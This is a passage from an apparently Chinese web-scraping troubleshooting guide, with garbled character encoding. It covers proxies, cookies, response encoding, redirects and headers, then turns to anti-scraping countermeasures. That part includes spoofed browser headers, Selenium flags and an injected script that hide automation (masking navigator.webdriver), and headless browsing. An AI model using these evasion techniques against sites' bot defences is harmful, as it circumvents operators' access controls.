<span class="nb">export</span><span class="w"> </span><span class="nv">HTTPS_PROXY</span><span class="o">=</span><span class="s2">&quot;http://proxy.com:8080&quot;</span>

<span class="c1"># Windows</span>
<span class="nb">set</span><span class="w"> </span><span class="nv">HTTP_PROXY</span><span class="o">=</span>http://proxy.com:8080
<span class="nb">set</span><span class="w"> </span><span class="nv">HTTPS_PROXY</span><span class="o">=</span>http://proxy.com:8080
</code></pre>
      </div>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># è‡ªåŠ¨ä½¿ç”¨ç¯å¢ƒå˜é‡ä¸­çš„ä»£ç†</span>
<span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>  <span class="c1"># ä¼šè‡ªåŠ¨è¯»å– HTTP_PROXY</span>
</code></pre>
      </div>

      <h4 id="5-éªŒè¯ä»£ç†é…ç½®">5. éªŒè¯ä»£ç†é…ç½®</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>

<span class="k">def</span><span class="w"> </span><span class="nf">test_proxy</span><span class="p">(</span><span class="n">proxy_url</span><span class="p">):</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;æµ‹è¯•ä»£ç†æ˜¯å¦å¯ç”¨&quot;&quot;&quot;</span>
    <span class="n">proxies</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s1">&#39;http&#39;</span><span class="p">:</span> <span class="n">proxy_url</span><span class="p">,</span>
        <span class="s1">&#39;https&#39;</span><span class="p">:</span> <span class="n">proxy_url</span><span class="p">,</span>
    <span class="p">}</span>

    <span class="k">try</span><span class="p">:</span>
        <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span>
            <span class="s1">&#39;http://httpbin.org/ip&#39;</span><span class="p">,</span>
            <span class="n">proxies</span><span class="o">=</span><span class="n">proxies</span><span class="p">,</span>
            <span class="n">timeout</span><span class="o">=</span><span class="mi">10</span>
        <span class="p">)</span>
        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;âœ… Proxy working: </span><span class="si">{</span><span class="n">response</span><span class="o">.</span><span class="n">json</span><span class="p">()</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
        <span class="k">return</span> <span class="kc">True</span>
    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;âŒ Proxy failed: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
        <span class="k">return</span> <span class="kc">False</span>

<span class="n">test_proxy</span><span class="p">(</span><span class="s1">&#39;http://127.0.0.1:7890&#39;</span><span class="p">)</span>
</code></pre>
      </div>

      <hr />

      <h2 id="cookie-å¤±æ•ˆ">Cookie å¤±æ•ˆ</h2>

      <h3 id="é—®é¢˜è¡¨ç°-5">é—®é¢˜è¡¨ç°</h3>

      <ul>
        <li>ç™»å½•çŠ¶æ€ä¸¢å¤±</li>
        <li>è¯·æ±‚è¢«é‡å®šå‘åˆ°ç™»å½•é¡µ</li>
        <li>è¿”å› 401 Unauthorized</li>
      </ul>

      <h3 id="è§£å†³æ–¹æ¡ˆ-5">è§£å†³æ–¹æ¡ˆ</h3>

      <h4 id="1-ä½¿ç”¨-session-ä¿æŒ-cookie">1. ä½¿ç”¨ Session ä¿æŒ Cookie</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>

<span class="c1"># åˆ›å»º Session</span>
<span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>

<span class="c1"># ç™»å½• (Cookie ä¼šè‡ªåŠ¨ä¿å­˜)</span>
<span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s1">&#39;https://example.com/login&#39;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span>
    <span class="s1">&#39;username&#39;</span><span class="p">:</span> <span class="s1">&#39;user&#39;</span><span class="p">,</span>
    <span class="s1">&#39;password&#39;</span><span class="p">:</span> <span class="s1">&#39;pass&#39;</span>
<span class="p">})</span>

<span class="c1"># åç»­è¯·æ±‚ä¼šè‡ªåŠ¨å¸¦ä¸Š Cookie</span>
<span class="n">response</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;https://example.com/profile&#39;</span><span class="p">)</span>
</code></pre>
      </div>

      <h4 id="2-æ‰‹åŠ¨ç®¡ç†-cookie">2. æ‰‹åŠ¨ç®¡ç† Cookie</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># è·å– Cookie</span>
<span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">login_url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">credentials</span><span class="p">)</span>
<span class="n">cookies</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="n">cookies</span>

<span class="c1"># ä½¿ç”¨ Cookie</span>
<span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">)</span>
</code></pre>
      </div>

      <h4 id="3-ä»æµè§ˆå™¨å¤åˆ¶-cookie">3. ä»æµè§ˆå™¨å¤åˆ¶ Cookie</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># æµè§ˆå™¨ä¸­å¤åˆ¶ Cookie å­—ç¬¦ä¸²</span>
<span class="n">cookie_str</span> <span class="o">=</span> <span class="s2">&quot;session_id=abc123; user_id=456; token=xyz&quot;</span>

<span class="c1"># è½¬æ¢ä¸ºå­—å…¸</span>
<span class="n">cookies</span> <span class="o">=</span> <span class="p">{}</span>
<span class="k">for</span> <span class="n">item</span> <span class="ow">in</span> <span class="n">cookie_str</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;; &#39;</span><span class="p">):</span>
    <span class="n">key</span><span class="p">,</span> <span class="n">value</span> <span class="o">=</span> <span class="n">item</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;=&#39;</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
    <span class="n">cookies</span><span class="p">[</span><span class="n">key</span><span class="p">]</span> <span class="o">=</span> <span class="n">value</span>

<span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">)</span>
</code></pre>
      </div>

      <h4 id="4-æŒä¹…åŒ–-cookie">4. æŒä¹…åŒ– Cookie</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">pickle</span>

<span class="c1"># ä¿å­˜ Cookie</span>
<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;cookies.pkl&#39;</span><span class="p">,</span> <span class="s1">&#39;wb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
    <span class="n">pickle</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="n">session</span><span class="o">.</span><span class="n">cookies</span><span class="p">,</span> <span class="n">f</span><span class="p">)</span>

<span class="c1"># åŠ è½½ Cookie</span>
<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;cookies.pkl&#39;</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
    <span class="n">cookies</span> <span class="o">=</span> <span class="n">pickle</span><span class="o">.</span><span class="n">load</span><span class="p">(</span><span class="n">f</span><span class="p">)</span>
    <span class="n">session</span><span class="o">.</span><span class="n">cookies</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">cookies</span><span class="p">)</span>
</code></pre>
      </div>

      <h4 id="5-cookie-è°ƒè¯•">5. Cookie è°ƒè¯•</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>

<span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>

<span class="c1"># æŸ¥çœ‹å½“å‰ Cookie</span>
<span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Current cookies:&quot;</span><span class="p">)</span>
<span class="k">for</span> <span class="n">cookie</span> <span class="ow">in</span> <span class="n">session</span><span class="o">.</span><span class="n">cookies</span><span class="p">:</span>
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;  </span><span class="si">{</span><span class="n">cookie</span><span class="o">.</span><span class="n">name</span><span class="si">}</span><span class="s2"> = </span><span class="si">{</span><span class="n">cookie</span><span class="o">.</span><span class="n">value</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;    Domain: </span><span class="si">{</span><span class="n">cookie</span><span class="o">.</span><span class="n">domain</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;    Path: </span><span class="si">{</span><span class="n">cookie</span><span class="o">.</span><span class="n">path</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;    Expires: </span><span class="si">{</span><span class="n">cookie</span><span class="o">.</span><span class="n">expires</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
</code></pre>
      </div>

      <hr />

      <h2 id="å“åº”ç¼–ç é—®é¢˜">å“åº”ç¼–ç é—®é¢˜</h2>

      <h3 id="é—®é¢˜è¡¨ç°-6">é—®é¢˜è¡¨ç°</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># ä¹±ç è¾“å‡º</span>
<span class="nb">print</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>  <span class="c1"># è¾“å‡º: ï¿½ï¿½ï¿½ï¿½ï¿½</span>
</code></pre>
      </div>

      <h3 id="è§£å†³æ–¹æ¡ˆ-6">è§£å†³æ–¹æ¡ˆ</h3>

      <h4 id="1-è‡ªåŠ¨æ£€æµ‹ç¼–ç ">1. è‡ªåŠ¨æ£€æµ‹ç¼–ç </h4>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">chardet</span><span class="w"> </span><span class="kn">import</span> <span class="n">detect</span>

<span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>

<span class="c1"># æ£€æµ‹ç¼–ç </span>
<span class="n">encoding</span> <span class="o">=</span> <span class="n">detect</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">content</span><span class="p">)[</span><span class="s1">&#39;encoding&#39;</span><span class="p">]</span>
<span class="n">response</span><span class="o">.</span><span class="n">encoding</span> <span class="o">=</span> <span class="n">encoding</span>

<span class="nb">print</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>  <span class="c1"># æ­£ç¡®æ˜¾ç¤ºä¸­æ–‡</span>
</code></pre>
      </div>

      <h4 id="2-æ‰‹åŠ¨æŒ‡å®šç¼–ç ">2. æ‰‹åŠ¨æŒ‡å®šç¼–ç </h4>

      <div class="codehilite">
        <pre><span></span><code><span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>

<span class="c1"># å¸¸è§ä¸­æ–‡ç¼–ç </span>
<span class="n">response</span><span class="o">.</span><span class="n">encoding</span> <span class="o">=</span> <span class="s1">&#39;utf-8&#39;</span>
<span class="c1"># æˆ–</span>
<span class="n">response</span><span class="o">.</span><span class="n">encoding</span> <span class="o">=</span> <span class="s1">&#39;gbk&#39;</span>
<span class="c1"># æˆ–</span>
<span class="n">response</span><span class="o">.</span><span class="n">encoding</span> <span class="o">=</span> <span class="s1">&#39;gb2312&#39;</span>

<span class="nb">print</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
</code></pre>
      </div>

      <h4 id="3-ç›´æ¥ä½¿ç”¨-bytes">3. ç›´æ¥ä½¿ç”¨ bytes</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>

<span class="c1"># ä½¿ç”¨ content (bytes) è€Œä¸æ˜¯ text (str)</span>
<span class="n">html</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="n">content</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">,</span> <span class="n">errors</span><span class="o">=</span><span class="s1">&#39;ignore&#39;</span><span class="p">)</span>
</code></pre>
      </div>

      <hr />

      <h2 id="é‡å®šå‘é—®é¢˜">é‡å®šå‘é—®é¢˜</h2>

      <h3 id="é—®é¢˜è¡¨ç°-7">é—®é¢˜è¡¨ç°</h3>

      <ul>
        <li>æ— é™é‡å®šå‘</li>
        <li>é‡å®šå‘åä¸¢å¤±å‚æ•°</li>
      </ul>

      <h3 id="è§£å†³æ–¹æ¡ˆ-7">è§£å†³æ–¹æ¡ˆ</h3>

      <h4 id="1-æ§åˆ¶é‡å®šå‘">1. æ§åˆ¶é‡å®šå‘</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># ç¦æ­¢è‡ªåŠ¨é‡å®šå‘</span>
<span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">allow_redirects</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Status: </span><span class="si">{</span><span class="n">response</span><span class="o">.</span><span class="n">status_code</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Location: </span><span class="si">{</span><span class="n">response</span><span class="o">.</span><span class="n">headers</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;Location&#39;</span><span class="p">)</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>

<span class="c1"># æ‰‹åŠ¨å¤„ç†é‡å®šå‘</span>
<span class="k">if</span> <span class="n">response</span><span class="o">.</span><span class="n">status_code</span> <span class="ow">in</span> <span class="p">[</span><span class="mi">301</span><span class="p">,</span> <span class="mi">302</span><span class="p">,</span> <span class="mi">303</span><span class="p">,</span> <span class="mi">307</span><span class="p">,</span> <span class="mi">308</span><span class="p">]:</span>
    <span class="n">redirect_url</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="n">headers</span><span class="p">[</span><span class="s1">&#39;Location&#39;</span><span class="p">]</span>
    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">redirect_url</span><span class="p">)</span>
</code></pre>
      </div>

      <h4 id="2-æŸ¥çœ‹é‡å®šå‘å†å²">2. æŸ¥çœ‹é‡å®šå‘å†å²</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>

<span class="c1"># æŸ¥çœ‹é‡å®šå‘é“¾</span>
<span class="k">for</span> <span class="n">r</span> <span class="ow">in</span> <span class="n">response</span><span class="o">.</span><span class="n">history</span><span class="p">:</span>
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">r</span><span class="o">.</span><span class="n">status_code</span><span class="si">}</span><span class="s2"> -&gt; </span><span class="si">{</span><span class="n">r</span><span class="o">.</span><span class="n">url</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>

<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Final: </span><span class="si">{</span><span class="n">response</span><span class="o">.</span><span class="n">status_code</span><span class="si">}</span><span class="s2"> -&gt; </span><span class="si">{</span><span class="n">response</span><span class="o">.</span><span class="n">url</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
</code></pre>
      </div>

      <hr />

      <h2 id="headers-é…ç½®é—®é¢˜">Headers é…ç½®é—®é¢˜</h2>

      <h3 id="é—®é¢˜è¡¨ç°-8">é—®é¢˜è¡¨ç°</h3>

      <ul>
        <li>è¯·æ±‚è¢«æ‹’ç»</li>
        <li>è¿”å›å¼‚å¸¸æ•°æ®</li>
      </ul>

      <h3 id="è§£å†³æ–¹æ¡ˆ-8">è§£å†³æ–¹æ¡ˆ</h3>

      <h4 id="1-å®Œæ•´çš„-headers">1. å®Œæ•´çš„ Headers</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s1">&#39;User-Agent&#39;</span><span class="p">:</span> <span class="s1">&#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36&#39;</span><span class="p">,</span>
    <span class="s1">&#39;Accept&#39;</span><span class="p">:</span> <span class="s1">&#39;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#39;</span><span class="p">,</span>
    <span class="s1">&#39;Accept-Language&#39;</span><span class="p">:</span> <span class="s1">&#39;zh-CN,zh;q=0.9,en;q=0.8&#39;</span><span class="p">,</span>
    <span class="s1">&#39;Accept-Encoding&#39;</span><span class="p">:</span> <span class="s1">&#39;gzip, deflate, br&#39;</span><span class="p">,</span>
    <span class="s1">&#39;Connection&#39;</span><span class="p">:</span> <span class="s1">&#39;keep-alive&#39;</span><span class="p">,</span>
    <span class="s1">&#39;Referer&#39;</span><span class="p">:</span> <span class="s1">&#39;https://example.com/&#39;</span><span class="p">,</span>
    <span class="s1">&#39;Origin&#39;</span><span class="p">:</span> <span class="s1">&#39;https://example.com&#39;</span><span class="p">,</span>
<span class="p">}</span>

<span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
</code></pre>
      </div>

      <h4 id="2-ä»æµè§ˆå™¨å¤åˆ¶-headers">2. ä»æµè§ˆå™¨å¤åˆ¶ Headers</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// æµè§ˆå™¨æ§åˆ¶å°æ‰§è¡Œ</span>
<span class="nx">copy</span><span class="p">(</span><span class="nb">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">(</span><span class="nb">Object</span><span class="p">.</span><span class="nx">fromEntries</span><span class="p">([...</span><span class="nb">document</span><span class="p">.</span><span class="nx">querySelector</span><span class="p">(</span><span class="s1">&#39;.request-headers&#39;</span><span class="p">).</span><span class="nx">querySelectorAll</span><span class="p">(</span><span class="s1">&#39;tr&#39;</span><span class="p">)].</span><span class="nx">map</span><span class="p">(</span><span class="nx">r</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">[</span><span class="nx">r</span><span class="p">.</span><span class="nx">cells</span><span class="p">[</span><span class="mf">0</span><span class="p">].</span><span class="nx">textContent</span><span class="p">,</span><span class="w"> </span><span class="nx">r</span><span class="p">.</span><span class="nx">cells</span><span class="p">[</span><span class="mf">1</span><span class="p">].</span><span class="nx">textContent</span><span class="p">])),</span><span class="w"> </span><span class="kc">null</span><span class="p">,</span><span class="w"> </span><span class="mf">2</span><span class="p">))</span>
</code></pre>
      </div>

      <h4 id="3-è°ƒè¯•-headers">3. è°ƒè¯• Headers</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># æŸ¥çœ‹è¯·æ±‚å¤´</span>
<span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;http://httpbin.org/headers&#39;</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">json</span><span class="p">())</span>

<span class="c1"># æŸ¥çœ‹å“åº”å¤´</span>
<span class="nb">print</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">headers</span><span class="p">)</span>
</code></pre>
      </div>

      <hr />

      <h2 id="ç›¸å…³ç« èŠ‚">ğŸ“š ç›¸å…³ç« èŠ‚</h2>

      <ul>
        <li><a href="#01-Foundations-http-https-protocol">HTTP/HTTPS åè®®</a></li>
        <li><a href="#08-Cheat-Sheets-http-headers">HTTP Headers é€ŸæŸ¥</a></li>
        <li><a href="#03-Basic-Recipes-debugging-techniques">è°ƒè¯•æŠ€å·§</a></li>
      </ul>

    </div>

    <div class="section" id="10-Troubleshooting-anti-scraping-issues">
      <h2>76. Anti-Scraping Issues</h2>
      <h1 id="åçˆ¬è™«é—®é¢˜">åçˆ¬è™«é—®é¢˜</h1>

      <p>åº”å¯¹å„ç§åçˆ¬è™«æœºåˆ¶çš„å¸¸è§é—®é¢˜å’Œè§£å†³æ–¹æ¡ˆã€‚</p>

      <hr />

      <h2 id="403-forbidden">403 Forbidden</h2>

      <h3 id="é—®é¢˜è¡¨ç°">é—®é¢˜è¡¨ç°</h3>

      <pre><code>HTTP 403 Forbidden
Access Denied
</code></pre>

      <h3 id="åŸå› åˆ†æ">åŸå› åˆ†æ</h3>

      <ol>
        <li>User-Agent è¢«æ£€æµ‹</li>
        <li>Referer éªŒè¯å¤±è´¥</li>
        <li>IP è¢«å°ç¦</li>
        <li>ç¼ºå°‘å¿…è¦çš„ Headers</li>
        <li>JavaScript æŒ‘æˆ˜æœªé€šè¿‡</li>
      </ol>

      <h3 id="è§£å†³æ–¹æ¡ˆ">è§£å†³æ–¹æ¡ˆ</h3>

      <h4 id="1-å®Œå–„-headers">1. å®Œå–„ Headers</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>

<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s1">&#39;User-Agent&#39;</span><span class="p">:</span> <span class="s1">&#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36&#39;</span><span class="p">,</span>
    <span class="s1">&#39;Accept&#39;</span><span class="p">:</span> <span class="s1">&#39;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&#39;</span><span class="p">,</span>
    <span class="s1">&#39;Accept-Language&#39;</span><span class="p">:</span> <span class="s1">&#39;zh-CN,zh;q=0.9,en;q=0.8&#39;</span><span class="p">,</span>
    <span class="s1">&#39;Accept-Encoding&#39;</span><span class="p">:</span> <span class="s1">&#39;gzip, deflate, br&#39;</span><span class="p">,</span>
    <span class="s1">&#39;Connection&#39;</span><span class="p">:</span> <span class="s1">&#39;keep-alive&#39;</span><span class="p">,</span>
    <span class="s1">&#39;Upgrade-Insecure-Requests&#39;</span><span class="p">:</span> <span class="s1">&#39;1&#39;</span><span class="p">,</span>
    <span class="s1">&#39;Sec-Fetch-Dest&#39;</span><span class="p">:</span> <span class="s1">&#39;document&#39;</span><span class="p">,</span>
    <span class="s1">&#39;Sec-Fetch-Mode&#39;</span><span class="p">:</span> <span class="s1">&#39;navigate&#39;</span><span class="p">,</span>
    <span class="s1">&#39;Sec-Fetch-Site&#39;</span><span class="p">:</span> <span class="s1">&#39;none&#39;</span><span class="p">,</span>
    <span class="s1">&#39;Sec-Fetch-User&#39;</span><span class="p">:</span> <span class="s1">&#39;?1&#39;</span><span class="p">,</span>
    <span class="s1">&#39;Cache-Control&#39;</span><span class="p">:</span> <span class="s1">&#39;max-age=0&#39;</span><span class="p">,</span>
<span class="p">}</span>

<span class="c1"># å¦‚æœæ˜¯ä»å…¶ä»–é¡µé¢è·³è½¬è¿‡æ¥çš„ï¼Œæ·»åŠ  Referer</span>
<span class="n">headers</span><span class="p">[</span><span class="s1">&#39;Referer&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;https://example.com/previous-page&#39;</span>

<span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
</code></pre>
      </div>

      <h4 id="2-ä½¿ç”¨çœŸå®æµè§ˆå™¨ç¯å¢ƒ">2. ä½¿ç”¨çœŸå®æµè§ˆå™¨ç¯å¢ƒ</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">selenium</span><span class="w"> </span><span class="kn">import</span> <span class="n">webdriver</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">selenium.webdriver.chrome.options</span><span class="w"> </span><span class="kn">import</span> <span class="n">Options</span>

<span class="n">options</span> <span class="o">=</span> <span class="n">Options</span><span class="p">()</span>
<span class="n">options</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;--disable-blink-features=AutomationControlled&#39;</span><span class="p">)</span>
<span class="n">options</span><span class="o">.</span><span class="n">add_experimental_option</span><span class="p">(</span><span class="s1">&#39;excludeSwitches&#39;</span><span class="p">,</span> <span class="p">[</span><span class="s1">&#39;enable-automation&#39;</span><span class="p">])</span>
<span class="n">options</span><span class="o">.</span><span class="n">add_experimental_option</span><span class="p">(</span><span class="s1">&#39;useAutomationExtension&#39;</span><span class="p">,</span> <span class="kc">False</span><span class="p">)</span>

<span class="n">driver</span> <span class="o">=</span> <span class="n">webdriver</span><span class="o">.</span><span class="n">Chrome</span><span class="p">(</span><span class="n">options</span><span class="o">=</span><span class="n">options</span><span class="p">)</span>

<span class="c1"># ä¿®æ”¹ webdriver å±æ€§</span>
<span class="n">driver</span><span class="o">.</span><span class="n">execute_cdp_cmd</span><span class="p">(</span><span class="s1">&#39;Page.addScriptToEvaluateOnNewDocument&#39;</span><span class="p">,</span> <span class="p">{</span>
    <span class="s1">&#39;source&#39;</span><span class="p">:</span> <span class="s1">&#39;&#39;&#39;</span>
<span class="s1">        Object.defineProperty(navigator, &#39;webdriver&#39;, {</span>
<span class="s1">            get: () =&gt; undefined</span>
<span class="s1">        })</span>
<span class="s1">    &#39;&#39;&#39;</span>
<span class="p">})</span>

<span class="n">driver</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
</code></pre>
      </div>

      <h4 id="3-ä½¿ç”¨æ— å¤´æµè§ˆå™¨">3. ä½¿ç”¨æ— å¤´æµè§ˆå™¨</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">playwright.sync_api</span><span class="w"> </span><span class="kn">import</span> <span class="n">sync_playwright</span>

<span class="k">with</span> <span class="n">sync_playwright</span><span class="p">()</span> <span class="k">as</span> <span class="n">p</span><span class="p">:</span>
    <span class="n">browser</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">chromium</span><span class="o">.</span><span class="n">launch</span><span class="p">(</span><span class="n">headless</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
    <span class="n">page</span> <span class="o">=</span> <span class="n">browser</span><span class="o">.</span><span class="n">new_page</span><span class="p">()</span>

    <span class="c1"># è®¾ç½®é¢å¤–çš„ headers</span>
    <span class="n">page</span><span class="o">.</span><span class="n">set_extra_http_headers</span><span class="p">({</span>
        <span class="s1">&#39;Accept-Language&#39;</span><span class="p">:</span> <span class="s1">&#39;zh-CN,zh;q=0.9&#39;</span><span class="p">,</span>
    <span class="p">})</span>

    <span class="n">page</span><span class="o">.</span><span class="n">goto</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
    <span class="n">content</span> <span class="o">=</span> <span class="n">page</span><span class="o">.</span><span class="n">content</span><span class="p">()</span>
    <span class="n">browser</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</code></pre>
      </div>

      <hr />

      <h2 id="429-too-many-requests">429 Too Many Requests</h2>

      <h3 id="é—®é¢˜è¡¨ç°-2">é—®é¢˜è¡¨ç°</h3>

      <pre><code>HTTP 429 Too Many Requests
Rate limit exceeded
</code></pre>

      <h3 id="åŸå› åˆ†æ-2">åŸå› åˆ†æ</h3>

      <ol>
        <li>è¯·æ±‚é¢‘ç‡è¿‡é«˜</li>
        <li>åŒä¸€ IP è¯·æ±‚è¿‡å¤š</li>
        <li>è¶…è¿‡ API é™é¢</li>
      </ol>

      <h3 id="è§£å†³æ–¹æ¡ˆ-2">è§£å†³æ–¹æ¡ˆ</h3>

      <h4 id="1-æ·»åŠ è¯·æ±‚å»¶è¿Ÿ">1. æ·»åŠ è¯·æ±‚å»¶è¿Ÿ</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">time</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">random</span>

